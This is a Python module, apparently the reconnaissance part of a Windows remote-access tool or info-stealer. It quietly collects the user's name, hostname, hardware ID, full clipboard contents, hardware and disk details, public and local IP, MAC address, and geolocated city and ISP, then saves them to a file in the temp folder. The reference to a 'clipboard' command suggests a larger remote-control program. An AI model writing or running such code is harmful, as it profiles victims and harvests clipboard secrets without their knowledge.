import os
import re
import uuid
import psutil
import requests
import win32api
import wmi
import socket
import pyperclip


def user():
    display_name = win32api.GetUserNameEx(win32api.NameDisplay)
    hostname = os.getenv('COMPUTERNAME')
    username = os.getenv('USERNAME')

    return f"\nDisplay Name: {display_name} \nHostname: {hostname} \nUsername: {username}\n"
        

def system():
    try:
        hwid = wmi.WMI().Win32_ComputerSystemProduct()[0].UUID
    except:
        hwid = "Unknown"
    
    try:
        clipboard = f"``````{pyperclip.paste()}``````"
    except:
        clipboard = "Unknown"
    
    if clipboard == "":
        clipboard = "null"
    elif len(clipboard) > 1500:
        clipboard = "Clipboard is too long, use 'clipboard' command to get full clipboard!" 
    
    def get_os():
        try:
            wmi_obj = wmi.WMI()
            os_info = wmi_obj.Win32_OperatingSystem()[0]
            return os_info.Caption
        except:
            return "Unknown"
    
    os = get_os()
    cpu = wmi.WMI().Win32_Processor()[0].Name
    gpu = wmi.WMI().Win32_VideoController()[0].Name
    ram = wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize
    ram = round(float(ram) / 1048576)
    
    return f"\nCPU: {cpu}\nGPU: {gpu}\nRAM: {ram}GB\nClipboard: {clipboard}\nHWID: {hwid}\nOS: {os}\n"


def disk():
    disks = ["\n", ("{:<10}" * 4).format("Disk", "Free", "Total", "Used%"), "\n"]
    for i in psutil.disk_partitions(all=False):
        if os.name == 'nt' and ('cdrom' in i.opts or i.fstype == ''):
            continue
        usage = psutil.disk_usage(i.mountpoint)
        disks.append("{:<9} {:<9} {:<9} {:<9}\n".format(i.device, str(usage.free // (2**30)) + "GB", str(usage.total // (2**30)) + "GB", str(usage.percent) + "%" + "\n"))
    return "".join(disks)


def network():
    def location(ip):
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}) #Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
            data = response.json()
            return data["country"], data["regionName"], data["city"], data["zip"], data["as"]
        except:
            return "Unknown", "Unknown", "Unknown", "Unknown", "Unknown"

    try:
        public_ip = requests.get("https://api.ipify.org").text
    except:
        public_ip = "Unknown"
    private_ip = socket.gethostbyname(socket.getfqdn())
    mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    country, region, city, zip_code, isp = location(public_ip) #if public_ip != "Unknown":  country, region, city, zip_code, isp = location(public_ip)
    try:
        return f"\nPublic IP: {public_ip}\nLocal IP: {private_ip}\nMAC Address: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city}, {zip_code}\nISP: {isp}"
    except: return "Unknown"


#print(f"User data: {user()}\nSystem data: {system()}\nDisk data: {disk()}\nNetwork data: {network()}")
def start():
    try:
        with open(f"{os.getenv('temp')}\\system.txt", "w",encoding="utf-8") as f:
            f.write(f"User data: {user()}\nSystem data: {system()}\nDisk data: {disk()}\nNetwork data: {network()}")
    except:
        pass
        
#save()
